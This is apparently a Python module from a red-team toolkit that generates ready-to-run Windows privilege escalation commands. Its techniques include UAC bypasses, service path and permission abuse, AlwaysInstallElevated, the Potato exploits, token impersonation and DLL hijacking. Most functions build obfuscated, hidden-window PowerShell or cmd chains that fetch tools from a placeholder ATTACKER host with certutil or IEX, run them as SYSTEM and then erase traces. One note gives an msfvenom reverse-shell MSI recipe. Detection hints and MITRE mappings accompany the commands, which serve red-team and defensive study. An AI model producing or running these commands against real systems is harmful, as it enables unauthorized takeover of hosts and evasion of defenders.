"""
Windows privilege escalation template generator.
Returns ready-to-run commands for escalating from standard user or service accounts
to SYSTEM / local admin on a compromised Windows host.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "uac_bypass_fodhelper",
    "uac_bypass_eventvwr",
    "uac_bypass_diskcleanup",
    "unquoted_service_path",
    "weak_service_perms",
    "always_install_elevated",
    "printspoofer",
    "godpotato",
    "juicypotato",
    "token_impersonation",
    "winpeas",
    "dll_hijack_path",
)


@dataclass
class PrivescResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


_PRIVESC_MITRE = {
    "uac_bypass_fodhelper": ("T1548.002", "HIGH", [
        "Sysmon Event 13 on HKCU\\Software\\Classes\\ms-settings registry",
        "fodhelper.exe spawning non-default child process",
    ]),
    "uac_bypass_eventvwr": ("T1548.002", "HIGH", [
        "eventvwr.exe child process is not mmc.exe",
        "Registry write to HKCU\\Software\\Classes\\mscfile",
    ]),
    "uac_bypass_diskcleanup": ("T1548.002", "HIGH", [
        "SilentCleanup task running as elevated user with non-default args",
        "Registry hijack on \\Environment under SilentCleanup task",
    ]),
    "unquoted_service_path": ("T1574.009", "HIGH", [
        "EDR file write under C:\\ root or Program Files prefix",
        "Service binary path lacks quotes (configuration audit)",
    ]),
    "weak_service_perms": ("T1574.011", "HIGH", [
        "sc.exe config altering binPath outside normal ops window",
        "Service binary replaced by non-installer process",
    ]),
    "always_install_elevated": ("T1548.002", "HIGH", [
        "msiexec.exe /quiet running with elevated token from std user",
        "HKLM/HKCU AlwaysInstallElevated=1 configuration drift",
    ]),
    "printspoofer": ("T1134.001", "CRITICAL", [
        "PrintSpoofer.exe / SpoolSample.exe process creation",
        "SeImpersonatePrivilege use from SYSTEM-impersonated thread",
    ]),
    "godpotato": ("T1134.001", "CRITICAL", [
        "GodPotato.exe process creation",
        "DCOM activation followed by token impersonation",
    ]),
    "juicypotato": ("T1134.001", "CRITICAL", [
        "JuicyPotato.exe process creation (legacy systems)",
        "Anonymous pipe + RPC server bind from non-system service",
    ]),
    "token_impersonation": ("T1134.001", "HIGH", [
        "Sysmon Event 12 — process token handle duplication",
        "Use of OpenProcessToken / DuplicateTokenEx by non-system process",
    ]),
    "winpeas": ("T1082", "MEDIUM", [
        "winPEAS.exe / .ps1 download and execution",
        "Enumeration-heavy reads of registry/filesystem in short window",
    ]),
    "dll_hijack_path": ("T1574.001", "HIGH", [
        "Sysmon Event 7 — image load from writable user-controlled path",
        "Process loading DLL from %TEMP% or download folder",
    ]),
}


# ── Techniques ────────────────────────────────────────────────────────────────

def _uac_bypass_fodhelper(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    reg = r"HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    code = (
        f"$r='{reg}';"
        f"New-Item $r -Force|Out-Null;"
        f"New-ItemProperty $r -Name 'DelegateExecute' -Value '' -Force|Out-Null;"
        f"Set-ItemProperty $r -Name '(default)' -Value '{payload}' -Force;"
        f"Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
        f"Start-Sleep 3;"
        f"Remove-Item 'HKCU:\\Software\\Classes\\ms-settings\\' -Recurse -Force"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PrivescResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="uac_bypass_fodhelper",
        notes=(
            "Requires medium integrity (standard logged-on user). "
            "Triggers UAC auto-elevation via fodhelper.exe manifest. "
            "Cleans up HKCU registry key after launch. Tested: Win10/11, Server 2016-2022."
        ),
    )


def _uac_bypass_eventvwr(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    reg = r"HKCU:\Software\Classes\mscfile\shell\open\command"
    code = (
        f"$r='{reg}';"
        f"New-Item $r -Force|Out-Null;"
        f"Set-ItemProperty $r -Name '(default)' -Value '{payload}' -Force;"
        f"Start-Process 'C:\\Windows\\System32\\eventvwr.exe';"
        f"Start-Sleep 3;"
        f"Remove-Item 'HKCU:\\Software\\Classes\\mscfile\\' -Recurse -Force"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PrivescResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="uac_bypass_eventvwr",
        notes=(
            "Requires medium integrity. eventvwr.exe opens mscfile via ShellExecute — "
            "HKCU override takes precedence over HKLM. "
            "Patched on some Win10 1903+ builds — try fodhelper as fallback."
        ),
    )


def _uac_bypass_diskcleanup(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    # SilentCleanup task runs as SYSTEM and inherits the caller's env, including windir.
    # Overwriting windir makes it execute cmd /c <payload> instead of %SystemRoot%\system32\cleanmgr.exe.
    cmd = (
        f'reg add "HKCU\\Environment" /v windir /d "cmd /c start /min {payload} & " /f && '
        f"schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I && "
        f"ping -n 6 127.0.0.1 > nul && "
        f'reg delete "HKCU\\Environment" /v windir /f'
    )
    return PrivescResult(
        command=cmd,
        technique="uac_bypass_diskcleanup",
        notes=(
            "Requires medium integrity. SilentCleanup task auto-elevates and inherits HKCU env. "
            "cmd.exe /c is used so payload runs detached; `start /min` keeps it hidden. "
            "Clean: reg delete restores windir after ~5s delay."
        ),
    )


def _unquoted_service_path(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    # Enumerate services with unquoted paths containing spaces, then drop payload.
    # The `name` param is used as the target service to restart.
    enum_cmd = (
        'wmic service get name,displayname,pathname,startmode '
        '| findstr /i "auto" | findstr /i /v "C:\\\\Windows\\\\" | findstr /i /v "\\"'
    )
    drop_cmd = f'copy /y "{payload}" "C:\\Program Files\\placeholder.exe"'
    restart_cmd = f'sc.exe stop "{name}" && sc.exe start "{name}"'
    cmd = f"{enum_cmd}\n:: Drop payload to unquoted path gap, then restart service:\n{drop_cmd}\n{restart_cmd}"
    return PrivescResult(
        command=cmd,
        technique="unquoted_service_path",
        notes=(
            "Step 1: run the wmic enum to find candidate services. "
            "Step 2: identify path gap (e.g. C:\\Program Files\\Vendor Service\\svc.exe → drop C:\\Program Files\\Vendor.exe). "
            "Step 3: drop payload to the gap path and restart the service. Requires write access to gap directory. "
            f"name param ('{name}') used as service to restart — replace with actual target."
        ),
    )


def _weak_service_perms(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    # Enumerate writable services with accesschk, then reconfigure binPath.
    enum_cmd = f'accesschk.exe /accepteula -uwcqv "{name}"'
    reconfig_cmd = (
        f'sc.exe config "{name}" binPath= "{payload}" && '
        f'sc.exe stop "{name}" && '
        f'sc.exe start "{name}"'
    )
    cmd = f"{enum_cmd}\n:: If SERVICE_CHANGE_CONFIG right confirmed, reconfigure:\n{reconfig_cmd}"
    return PrivescResult(
        command=cmd,
        technique="weak_service_perms",
        notes=(
            "Requires SERVICE_CHANGE_CONFIG permission on target service. "
            "Use accesschk.exe (Sysinternals) or PowerUp's Get-ModifiableService to enumerate. "
            f"Replace '{name}' with the vulnerable service name. "
            "Restore: sc.exe config <name> binPath= <original_path> after test."
        ),
    )


def _always_install_elevated(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    tmp_msi = r"C:\Windows\Temp\priv.msi"
    check_cmd = (
        'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && '
        'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
    )
    # msfvenom-generated MSI is the standard approach; document the creation step
    exec_cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/priv.msi {tmp_msi} && '
        f'msiexec /quiet /qn /i {tmp_msi}'
    )
    cmd = f"{check_cmd}\n:: If both keys = 0x1, AlwaysInstallElevated is enabled — execute MSI:\n{exec_cmd}"
    return PrivescResult(
        command=cmd,
        technique="always_install_elevated",
        notes=(
            "Both HKCU and HKLM keys must be set to 1 for exploitation. "
            "Generate MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f msi -o priv.msi. "
            "Or use PowerUp's Write-UserAddMSI for a no-external-tool approach. "
            "Replace ATTACKER with staging host."
        ),
    )


def _printspoofer(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    tmp = r"C:\Windows\Temp\ps32.exe"
    cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/PrintSpoofer64.exe {tmp} && '
        f'{tmp} -i -c "{payload}" && '
        f'del /f /q {tmp}'
    )
    return PrivescResult(
        command=cmd,
        technique="printspoofer",
        notes=(
            "Requires SeImpersonatePrivilege (IIS, SQL Server, service accounts). "
            "Abuses the Print Spooler named pipe to impersonate SYSTEM. "
            "Source: github.com/itm4n/PrintSpoofer. Replace ATTACKER with staging host. "
            "Works on Windows 10 / Server 2016-2019. Use GodPotato for 2022+."
        ),
    )


def _godpotato(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    tmp = r"C:\Windows\Temp\gp.exe"
    cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/GodPotato-NET4.exe {tmp} && '
        f'{tmp} -cmd "{payload}" && '
        f'del /f /q {tmp}'
    )
    return PrivescResult(
        command=cmd,
        technique="godpotato",
        notes=(
            "Requires SeImpersonatePrivilege. Works on Windows Server 2012–2022 and Windows 10/11. "
            "Modern replacement for JuicyPotato — no CLSID hunting required. "
            "Source: github.com/BeichenDream/GodPotato. Replace ATTACKER with staging host."
        ),
    )


def _juicypotato(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    tmp = r"C:\Windows\Temp\jp.exe"
    # Well-known default CLSID for BITS: {4991D34B-80A1-4291-83B6-3328366B9097}
    clsid = "{4991D34B-80A1-4291-83B6-3328366B9097}"
    cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/JuicyPotato.exe {tmp} && '
        f'{tmp} -l 1337 -p "{payload}" -t * -c "{clsid}" && '
        f'del /f /q {tmp}'
    )
    return PrivescResult(
        command=cmd,
        technique="juicypotato",
        notes=(
            "Requires SeImpersonatePrivilege. Works on Windows ≤ Server 2019 / Windows 10 pre-1809. "
            f"Default CLSID: {clsid} (BITS). If blocked, enumerate alternatives: "
            "ohpe.us/CLSID/. Source: github.com/ohpe/juicy-potato. Replace ATTACKER."
        ),
    )


def _token_impersonation(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    code = (
        f"IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER/Invoke-TokenManipulation.ps1');"
        f"Invoke-TokenManipulation -ImpersonateUser -Username 'NT AUTHORITY\\SYSTEM';"
        f"Invoke-TokenManipulation -CreateProcess -Username 'NT AUTHORITY\\SYSTEM' -Process '{payload}'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PrivescResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="token_impersonation",
        notes=(
            "Requires SeDebugPrivilege or SeImpersonatePrivilege. "
            "Invoke-TokenManipulation is from PowerSploit/Incognito. Replace ATTACKER. "
            "Alternative: use incognito module in Meterpreter (`use incognito; impersonate_token`)."
        ),
    )


def _winpeas(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    tmp = r"C:\Windows\Temp\wp.exe"
    cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/winPEASx64.exe {tmp} && '
        f'{tmp} quiet servicesinfo windowscreds processinfo userinfo && '
        f'del /f /q {tmp}'
    )
    return PrivescResult(
        command=cmd,
        technique="winpeas",
        notes=(
            "Automated PrivEsc enumeration — not an exploit, output only. "
            "Flags: quiet (no banner), servicesinfo, windowscreds, processinfo, userinfo. "
            "Source: github.com/peass-ng/PEASS-ng. Replace ATTACKER with staging host. "
            "Review output for: unquoted paths, weak perms, stored credentials, token privileges."
        ),
    )


def _dll_hijack_path(payload: str, name: str, obfuscate: bool) -> PrivescResult:
    # Enumerate PATH directories writable by current user, then hint which DLL to drop.
    code = (
        f"$env:PATH -split ';' | ForEach-Object {{"
        f"$p=$_;try{{[IO.File]::OpenWrite(\"$p\\test.tmp\").Close();"
        f"Remove-Item \"$p\\test.tmp\" -Force;"
        f"Write-Host \"WRITABLE: $p\"}}catch{{}}"
        f"}};"
        f"Write-Host 'Drop a malicious DLL named after a missing import in a SYSTEM process to the writable dir.'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PrivescResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="dll_hijack_path",
        notes=(
            "Step 1: run the command to identify writable PATH directories ahead of system32. "
            "Step 2: use Process Monitor (ProcMon) or Procmon64 to identify DLLs loaded via PATH search. "
            f"Step 3: copy malicious DLL (e.g. compiled from msfvenom or custom) to the writable dir. "
            "Step 4: restart the target process or wait for it to reload. No admin required for HKCU PATH entries."
        ),
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "uac_bypass_fodhelper": _uac_bypass_fodhelper,
    "uac_bypass_eventvwr": _uac_bypass_eventvwr,
    "uac_bypass_diskcleanup": _uac_bypass_diskcleanup,
    "unquoted_service_path": _unquoted_service_path,
    "weak_service_perms": _weak_service_perms,
    "always_install_elevated": _always_install_elevated,
    "printspoofer": _printspoofer,
    "godpotato": _godpotato,
    "juicypotato": _juicypotato,
    "token_impersonation": _token_impersonation,
    "winpeas": _winpeas,
    "dll_hijack_path": _dll_hijack_path,
}


def generate_privesc(
    technique: str,
    payload: str = "C:\\Windows\\Temp\\payload.exe",
    name: str = "WindowsUpdate",
    obfuscate: bool = True,
) -> PrivescResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    result = _DISPATCH[technique](payload, name, obfuscate)
    mitre = _PRIVESC_MITRE.get(technique)
    if mitre:
        tid, risk, detections = mitre
        result.techniques = [tid]
        result.risk = risk
        result.detections = detections
    return result
